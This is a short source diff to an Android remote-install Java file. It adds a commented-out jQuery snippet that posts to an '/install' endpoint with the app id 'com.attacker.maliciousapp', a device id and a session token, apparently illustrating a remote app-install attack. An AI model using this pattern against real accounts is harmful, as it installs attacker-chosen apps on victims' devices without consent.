@@ -2,6 +2,16 @@ package org.remoteandroid.install;
 
 import java.io.File;
 
+/*
+ * Install from market, after authent
+ * $.post('/install', {
+ *   id: 'com.attacker.maliciousapp',
+ * device: initProps['selectedDeviceId'],
+ * token: initProps['token'],
+ * xhr: '1' }, function(data) {
+ * });
+ */
+
 import org.remoteandroid.CommunicationWithLock;
 
 import android.app.Activity;
